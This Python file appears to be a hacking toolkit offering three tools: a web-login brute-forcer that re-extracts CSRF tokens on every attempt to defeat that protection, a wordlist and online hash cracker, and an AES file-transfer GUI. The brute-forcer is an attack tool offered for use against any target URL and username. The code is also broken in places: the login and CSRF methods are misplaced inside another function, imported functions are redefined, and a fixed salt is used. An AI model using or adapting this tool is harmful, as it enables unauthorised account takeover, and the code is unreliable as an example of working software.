import threading
import requests
import time
import sys
import re
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import filedialog
import socket
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import os
import struct
import hashlib
from hashcracker import crack_hash, online_lookup, banner as hash_banner

class BruteForceCracker:

    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        self.session = requests.Session()
        if 'banner' in globals():
            for run in banner:
                sys.stdout.write(run)
                sys.stdout.flush()
                time.sleep(0.02)


def hash_cracker_banner():
    print("""
    =============================
        Hash Cracker
    =============================
    """)


def crack_hash(hash_type, hash_value, wordlist):
    try:
        with open(wordlist, 'r', encoding='utf-8') as file:
            for passwd in file:
                passwd = passwd.strip()
                if hash_type == "md5":
                    hashed_pass = hashlib.md5(passwd.encode()).hexdigest()
                elif hash_type == "sha1":
                    hashed_pass = hashlib.sha1(passwd.encode()).hexdigest()
                elif hash_type == "sha256":
                    hashed_pass = hashlib.sha256(passwd.encode()).hexdigest()
                elif hash_type == "sha512":
                    hashed_pass = hashlib.sha512(passwd.encode()).hexdigest()
                else:
                    print("[!] Unsupported hash type")
                    return

                if hashed_pass == hash_value:
                    print(f"[+] Password found: {passwd}")
                    return
            print("[-] Password not found in wordlist")
    except FileNotFoundError:
        print("[!] Wordlist file not found!")


def online_lookup(hash_value):
    print("[*] Searching online for hash...")
    url = f"http://hashtoolkit.com/reverse-hash?hash={hash_value}"
    response = requests.get(url)
    
    if response.status_code == 200:
        if hash_value in response.text:
            print("[+] Hash found online!")
        else:
            print("[-] Hash not found online.")
    else:
        print("[!] Failed to fetch data from HashToolKit.")


def hash_cracker_main():
    hash_cracker_banner()
    
    # Get user input for hash cracking
    hash_value = input("Enter hash value to crack: ")
    print("\nSupported hash types:")
    print("1. MD5")
    print("2. SHA1")
    print("3. SHA256")
    print("4. SHA512")
    
    hash_type_choice = input("\nSelect hash type (1-4): ")
    if hash_type_choice == '1':
        hash_type = 'md5'
    elif hash_type_choice == '2':
        hash_type = 'sha1'
    elif hash_type_choice == '3':
        hash_type = 'sha256'
    elif hash_type_choice == '4':
        hash_type = 'sha512'
    else:
        print("Invalid choice. Defaulting to MD5.")
        hash_type = 'md5'
    
    print("\nChoose cracking method:")
    print("1. Use wordlist")
    print("2. Online lookup")
    
    method_choice = input("\nSelect method (1-2): ")
    
    if method_choice == '1':
        wordlist = input("Enter path to wordlist file: ")
        crack_hash(hash_type, hash_value, wordlist)
    elif method_choice == '2':
        online_lookup(hash_value)
    else:
        print("Invalid choice.")

    def get_csrf_token(self):
        try:
            response = self.session.get(self.url)
            # Try to extract token using BeautifulSoup
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Look for common CSRF token field names
            csrf_field = soup.find('input', attrs={'name': re.compile(r'csrf|CSRF|token|_token', re.I)})
            if csrf_field and csrf_field.has_attr('value'):
                return csrf_field['name'], csrf_field['value']
            
            # Alternative method: look for meta tags
            meta_token = soup.find('meta', attrs={'name': re.compile(r'csrf|CSRF|token', re.I)})
            if meta_token and meta_token.has_attr('content'):
                return meta_token['name'], meta_token['content']
            
            # Last resort: try to find it in the HTML with regex
            match = re.search(r'name=["\'](_csrf|csrf_token|CSRF|token)["\'] value=["\'](.*?)["\']', response.text)
            if match:
                return match.group(1), match.group(2)
                
            print("Could not find CSRF token. The site might use a different method.")
            return None, None
        except Exception as e:
            print(f"Error getting CSRF token: {e}")
            return None, None

    def crack(self, password):
        # Get a fresh CSRF token for each attempt
        token_name, token_value = self.get_csrf_token()
        
        # Prepare the login data
        data_dict = {"UserName": self.username, "Password": password, "Log In": "submit"}
        
        # Add CSRF token if found
        if token_name and token_value:
            data_dict[token_name] = token_value
            print(f"Using CSRF token: {token_name}={token_value[:10]}...")
        
        # Make the login attempt
        response = self.session.post(self.url, data=data_dict)

        # Check if login was successful
        if self.error_message in str(response.content):
            return False
        else:
            print("\n[+] Success!")
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True


def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print(f"Trying Password: {count} Time For => {password}")
        if cracker.crack(password):
            return


def brute_force_main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    
    print("\n[*] Checking if site uses CSRF protection...")
    cracker = BruteForceCracker(url, username, error)
    token_name, token_value = cracker.get_csrf_token()
    
    if token_name and token_value:
        print(f"[+] CSRF token found: {token_name}")
        print("[*] Will attempt to bypass by extracting and including token with each request\n")
    else:
        print("[-] No CSRF token found or using a different protection method\n")
    
    password_file = "db/user_agents.db"
    if not os.path.exists(password_file):
        print(f"Error: Password file '{password_file}' not found.")
        print("Creating directory and sample password file...")
        os.makedirs(os.path.dirname(password_file), exist_ok=True)
        with open(password_file, "w") as f:
            f.write("password123\nadmin\n123456\nroot\nqwerty\n")
    
    with open(password_file, "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()
            t.join()


# Cryptographic File Sender functionality
def derive_key(password):
    salt = b'salt_'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # Key length for AES-256
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())


def pad_data(data):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    return padded_data


def unpad_data(data):
    unpadder = padding.PKCS7(128).unpadder()
    unpadded_data = unpadder.update(data) + unpadder.finalize()
    return unpadded_data


def send_file(sock, filename, password):
    key = derive_key(password)
    with open(filename, 'rb') as file:
        file_data = file.read()
        file_data = pad_data(file_data)

        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(file_data) + encryptor.finalize()

        filename_bytes = os.path.basename(filename).encode()
        sock.sendall(struct.pack('I', len(filename_bytes)) + filename_bytes)
        sock.sendall(iv + encrypted_data)


def decrypt_data(key, data):
    backend = default_backend()
    iv = data[:16]
    encrypted_data = data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadded_data = unpad_data(decrypted_data)
    return unpadded_data


def receive_file(key, port):
    host = '0.0.0.0'

    receiver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    receiver_socket.bind((host, port))
    receiver_socket.listen(1)
    print("Receiver is listening for incoming connections...")

    client_socket, client_address = receiver_socket.accept()
    print("Connection established with:", client_address)

    filename_len = struct.unpack('I', client_socket.recv(4))[0]
    filename = client_socket.recv(filename_len).decode()

    encrypted_data = b""
    while True:
        chunk = client_socket.recv(4096)
        if not chunk:
            break
        encrypted_data += chunk

    try:
        decrypted_data = decrypt_data(key, encrypted_data)
        with open(filename, 'wb') as file:
            file.write(decrypted_data)
            print(f"File received successfully: {filename}")
    except ValueError as e:
        print(f"Decryption failed: {e}")

    client_socket.close()
    receiver_socket.close()


def send_file_gui():
    password = password_entry.get()
    filename = file_path_label.cget("text")
    host = host_entry.get()
    port = int(port_entry.get())
    if password and filename and host and port:
        try:
            status_label.config(text="Attempting to connect...")
            root.update()
            sender_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sender_socket.settimeout(10)  # Set a timeout of 10 seconds
            sender_socket.connect((host, port))
            status_label.config(text="Connected! Sending file...")
            root.update()
            send_file(sender_socket, filename, password)
            sender_socket.close()
            status_label.config(text="File sent successfully!")
        except ConnectionRefusedError:
            status_label.config(text="Connection refused. Make sure receiver is running!")
        except socket.timeout:
            status_label.config(text="Connection timed out. Check host and port.")
        except Exception as e:
            status_label.config(text=f"Error: {str(e)}")
    else:
        status_label.config(text="Please fill in all fields!")


def receive_file_gui():
    key = password_entry.get()
    try:
        port = int(port_entry.get())
        if key and port:

            # Use threading to avoid blocking the UI
            def receive_thread():
                try:
                    derived_key = derive_key(key)
                    status_label.config(text="Listening for connections...")
                    root.update()
                    receive_file(derived_key, port)
                    status_label.config(text="File received successfully!")
                except Exception as e:
                    status_label.config(text=f"Error: {str(e)}")
            
            threading.Thread(target=receive_thread).start()
        else:
            status_label.config(text="Please enter a valid key and port!")
    except ValueError:
        status_label.config(text="Please enter a valid port number!")


def choose_file():
    filename = filedialog.askopenfilename()
    file_path_label.config(text=filename)


def crypto_file_sender():
    print("""
    # CipherLink by 3ntr0py
    # Secure File Transfer Tool
    # Version 1:0
    """)
    
    global password_entry, file_path_label, host_entry, port_entry, status_label, root
    
    root = tk.Tk()
    root.title("3ntr0py")
    root.geometry('400x500')
    root.configure(bg='black')

    def configure_widget(widget, font=('Helvetica', 10, 'bold'), bg='black', fg='white'):
        widget.configure(bg=bg, fg=fg, font=font)
        if isinstance(widget, tk.Entry):
            widget.configure(insertbackground='white')

    mode_label = tk.Label(root, text="CipherLink by 3ntr0py", font=('Helvetica', 16, 'bold'))
    configure_widget(mode_label)
    mode_label.pack(pady=10)

    # website_label = tk.Label(root, text="www.0x4m4.com", font=('Helvetica', 10, 'italic'))
    # configure_widget(website_label, font=('Helvetica', 10, 'italic'))
    # website_label.pack(pady=5)

    mode_var = tk.StringVar(value="send")
    send_radio = tk.Radiobutton(root, text="Send", variable=mode_var, value="send", selectcolor='black')
    configure_widget(send_radio)
    send_radio.pack(pady=5)
    receive_radio = tk.Radiobutton(root, text="Receive", variable=mode_var, value="receive", selectcolor='black')
    configure_widget(receive_radio)
    receive_radio.pack(pady=5)

    host_label = tk.Label(root, text="Enter Host:")
    configure_widget(host_label)
    host_label.pack(pady=5)
    host_entry = tk.Entry(root)
    configure_widget(host_entry)
    host_entry.pack(pady=5)

    port_label = tk.Label(root, text="Enter Port:")
    configure_widget(port_label)
    port_label.pack(pady=5)
    port_entry = tk.Entry(root)
    configure_widget(port_entry)
    port_entry.pack(pady=5)

    password_label = tk.Label(root, text="Enter Password/Key:")
    configure_widget(password_label)
    password_label.pack(pady=5)
    password_entry = tk.Entry(root, show="*")
    configure_widget(password_entry)
    password_entry.pack(pady=5)

    file_path_label = tk.Label(root, text="No file chosen")
    configure_widget(file_path_label)
    file_path_label.pack(pady=5)

    choose_file_button = tk.Button(root, text="Choose File", command=choose_file)
    configure_widget(choose_file_button)
    choose_file_button.pack(pady=5)

    execute_button = tk.Button(root, text="Execute", command=lambda: send_file_gui() if mode_var.get() == "send" else receive_file_gui())
    configure_widget(execute_button)
    execute_button.pack(pady=5)

    status_label = tk.Label(root, text="")
    configure_widget(status_label)
    status_label.pack(pady=10)

    root.mainloop()


def show_key_banner():
    key_banner = """
    🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑
    🔑                                                                       🔑
    🔑                       AERIS TOOLKIT OPTIONS                           🔑
    🔑                                                                       🔑
    🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑🔑
    
    1- Brute Force
    2- CipherLink
    3- Hash Cracker
    Enter your choice (1-3):
    """
    print(key_banner)


def main():
    show_key_banner()
    choice = input().strip()
    
    if choice == '1':
        # Run brute force functionality
        # Display brute force banner only when option 1 is selected
        print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                                        3ntr0py
        


""")
        brute_banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
        """
        global banner
        banner = brute_banner
        print(banner)
        brute_force_main()
    elif choice == '2':
        # Run cryptographic file sender
        crypto_file_sender()
    elif choice == '3':
        hash_cracker_main()
    else:
        print("Invalid choice. Please select 1 - 3.")
        main()


if __name__ == '__main__':
    main()
